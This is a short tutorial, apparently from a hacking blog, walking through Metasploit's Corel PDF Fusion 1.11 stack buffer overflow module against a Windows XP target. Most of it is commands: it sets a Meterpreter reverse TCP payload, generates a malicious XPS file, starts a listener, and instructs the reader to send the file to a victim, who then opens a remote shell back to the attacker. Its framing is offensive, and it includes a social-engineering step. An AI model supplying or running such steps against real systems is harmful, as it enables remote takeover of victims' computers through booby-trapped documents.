Exploit Remote Windows PC using Corel PDF Fusion Stack Buffer Overflow

This module exploits stack-based buffer overflow vulnerability in version 1.11 of Corel PDF Fusion. The vulnerability exists while handling a XPS file with long entry names. In order for the payload to be executed, an attacker must convince the target user to open a specially crafted XPS file with Corel PDF Fusion. By doing so, the attacker can execute arbitrary code as the target user.
Corel Pdf 1.11
Attacker: Kali Linux
Victim PC: Windows XP SP 3
Open Kali Linux terminal type msfconsole

Now type use exploit/windows/fileformat/corelpdf_fusion_bof
msf exploit (corelpdf_fusion_bof)>set payload windows/meterpreter/reverse_tcp
msf exploit (corelpdf_fusion_bof)>set lhost 192.168.1.147 (IP of Local Host)
msf exploit (corelpdf_fusion_bof)>exploit

After we successfully generate the malicious xps File, it will stored on your local computer
/root/.msf4/local/msf.xps

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.147
exploit
Now send your msf.xps files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
